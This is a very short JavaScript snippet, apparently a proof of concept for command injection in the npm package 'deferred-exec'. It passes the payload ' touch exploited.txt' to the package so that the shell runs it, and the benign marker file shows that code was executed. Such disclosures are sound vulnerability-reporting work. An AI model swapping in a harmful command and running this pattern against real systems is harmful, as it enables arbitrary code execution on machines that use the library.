const pkg = require('deferred-exec');

const payload = " touch exploited.txt"

console.log(pkg);

const command = payload;

const args = {};

pkg(command, args)